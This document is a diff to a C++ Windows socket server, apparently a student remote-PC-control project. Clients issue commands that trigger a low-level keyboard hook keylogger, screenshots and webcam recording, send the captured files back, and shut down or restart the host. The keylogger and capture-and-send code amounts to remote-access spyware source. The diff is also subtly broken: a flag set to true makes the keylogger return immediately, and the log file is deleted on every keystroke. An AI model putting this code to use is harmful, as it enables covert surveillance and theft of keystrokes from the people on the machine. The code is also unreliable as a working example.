@@ -6,6 +6,8 @@
 #include <opencv2/imgcodecs.hpp>
 #include <string> 
 #include <cstring>
+#include <thread>
+#include <atomic>
 // #define S_OK 0
 
 // Support both Linux and Windows machine
@@ -28,6 +30,7 @@ bool sendDataToClient(SOCKET s, const string &filePath) ;
 void shutDownComputer(){
     cout << "Computer will shut down in 30 second!";
     system("C:\\windows\\system32\\shutdown /s /t 30 \n\n");
+
 }   
 
 void restartComputer(){
@@ -91,16 +94,12 @@ bool sendDataToClient(SOCKET s, const string &filePath)
     cout << "Sending file: " << filePath << " to client." << endl;
 
     string total;
-    int maxSize = 1024 * 8; 
     while (file.read(buffer, BUFFER_SIZE) || file.gcount() > 0) 
     {
         total.append(buffer, file.gcount());
-        if(total.size() >= maxSize)
-            break;
     } 
     total.append(buffer, file.gcount());
     
-    cout << "Total " << total << endl;
 
     if (send(s, total.c_str(), total.size(), 0) == SOCKET_ERROR) 
     {
@@ -228,7 +227,7 @@ void captureScreen(const string &file_path){
     DeleteObject(hbmScreen);
     DeleteDC(hdcMemDC);
     ReleaseDC(NULL, hdcScreen);
-    GdiplusShutdown(gdipToken);
+    // GdiplusShutdown(gdipToken);
 }
 
 
@@ -302,15 +301,13 @@ void saveRecording(){
 
     // Call the recordVideo function
     recordVideo("output.avi", frameWidth, frameHeight,isWebCamOff);
-    
-
 }
 
 //capture key stroke
 void Keystroke(int key){
     ofstream logfile;
+    deleteFile("keylog.txt"); 
     logfile.open("keylog.txt", ios::app);
-
     if(key == VK_BACK)
         logfile << "[BACKSPACE]";
     else if(key == VK_RETURN)
@@ -344,15 +341,46 @@ LRESULT CALLBACK KeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam){
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
-//logKeyStrokeFunction
+std::atomic<bool> keyloggerActive(true); 
+
 void logKeyStroke(){
+    if(keyloggerActive) 
+        return; 
     HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoardProc, NULL, 0);
     MSG msg;
-    while(GetMessage(&msg, NULL, 0, 0)){
+    
+    // Get the second time entry (after the delay)
+    
+    // Subtract time2 from time1 to get the difference
+
+    // Convert the duration to seconds
+
+    while( GetMessage(&msg, NULL, 0, 0) ){
         TranslateMessage(&msg);
         DispatchMessage(&msg);
+        std::this_thread::sleep_for(std::chrono::milliseconds(10)); // To avoid CPU hogging
     }
     UnhookWindowsHookEx(keyboardHook);
+}
+// Function to monitor for the 'Esc' key to stop the keylogger
+void stopKeylogger() {
+    while (true) {
+        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {  // VK_ESCAPE is the 'Esc' key
+            std::cout << "Stopping keylogger..." << std::endl;
+            keyloggerActive = false;  // Stop the keylogger
+            break;
+        }
+        std::this_thread::sleep_for(std::chrono::milliseconds(10)); // To avoid CPU hogging
+    }
+}
+
+//logKeyStrokeFunction
+void handleKeyStroke(){ 
+    std::thread logKeyStrokeThread(logKeyStroke); 
+    std::thread stopKeyloggerThread(stopKeylogger); 
+
+    logKeyStrokeThread.join();
+    stopKeyloggerThread.join();
 }
 
 // for string delimiter 
@@ -376,18 +404,18 @@ void serverCallback(char buffer[1024], int clientSocket)
     // cout << "Client: " << buffer << endl; 
     string msg(buffer);
     vector<string> msgArr = splitSML(msg," ");
-    cout << "Full msg: " << msg << endl; 
+    // cout << "Full msg: " << msg << endl; 
 
     string command = msgArr[0];
     string payload ="";
     if(msgArr.size() >= 2)
     {
-        cout << "Payload: " << msgArr[1] << endl; 
+        // cout << "Payload: " << msgArr[1] << endl; 
         payload = msgArr[1];      
     }
 
-    cout << "Processing command: " << command << endl;
-    cout << "Processing payload: " << payload << endl;
+    cout << "\n\nProcessing command: " << command << endl;
+
 
     if(command == "listapp"){ 
        sendListApps(clientSocket);
@@ -409,43 +437,16 @@ void serverCallback(char buffer[1024], int clientSocket)
         saveRecording(); 
         sendDataToClient(clientSocket, "output.avi");
     } else if(command == "keylogger"){ 
-        logKeyStroke();
+        handleKeyStroke();
         sendDataToClient(clientSocket, "keylog.txt");
     }else if(command =="screenshot"){ 
-    captureScreen("screenshot.png"); 
-    sendDataToClient(clientSocket,"screenshot.png");
+        captureScreen("screenshot.png"); 
+        sendDataToClient(clientSocket,"screenshot.png");
+    }else if(command =="shutdown"){ 
+        shutDownComputer();
+    }else if(command =="restart"){ 
+        restartComputer();
     }
-
-
-    
-    // TEsTING EFATURES 
-    // shut down/reset 
-    // shutdown() 
-    // restartComputer();
-
-
-
-
-   
-
-    
-
-
-    // get file 
-    // sendDataToClient() 
-
-    //delete file 
-    // deleteFile("listApps.txt");
-
-    // screen shot 
-    // captureScreen("D:\\Development\\ktlt-rcpc-master\\ktlt-rcpc\\screenshot.png");  
- 
-   
-    // keylogger  
-    // logKeyStroke();
-
-
-
 
 }
 
@@ -465,7 +466,4 @@ int main() {
     socket.hostServer();
     socket.listenForConnection(&serverCallback);
 
-    
-
-    return 0;
 }
